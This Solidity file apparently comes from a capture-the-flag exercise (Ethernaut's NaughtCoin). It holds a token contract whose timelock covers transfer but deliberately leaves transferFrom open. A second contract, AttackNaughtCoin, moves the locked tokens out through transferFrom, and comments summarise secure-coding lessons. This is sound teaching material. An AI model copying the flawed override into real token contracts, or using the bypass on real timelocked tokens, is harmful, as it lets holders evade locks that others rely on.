// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title NaughtCoin
/// @author OpenZeppelin
/// @notice - When interfacing with contracts or implementing an ERC interface, implement all available functions, not implementing functions can result in an attacker implementing 
///         their own contract and change the interface method function
///         - If you plan to create your own tokens, consider newer protocols like: ERC223, ERC721 (used by Cryptokitties), ERC827 (ERC 20 killer)
///         - If you can, check for EIP 165 compliance, which confirms which interface an external contract is implementing. Conversely, if you are the one issuing tokens, remember to be EIP-165 compliant.
///         - Ensure to implement safe math if solidity ver ^0.8 is not used
///         - implement every function, and make sure that relevant modifiers are used where they should be used
///         - familiarize yourself with code that isnt yours before using it
///         - especially in the case of multiple imports or auth controls
///         - ex transfer isnt the only transfer method, we also have transferfrom for erc20

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 

contract AttackNaughtCoin {
  NaughtCoin coin;

  constructor(address _coin){
    coin = NaughtCoin(_coin);
  }

  function transferFrom(uint256 _amount) public {
    coin.transferFrom(msg.sender, address(this), _amount);
  }
}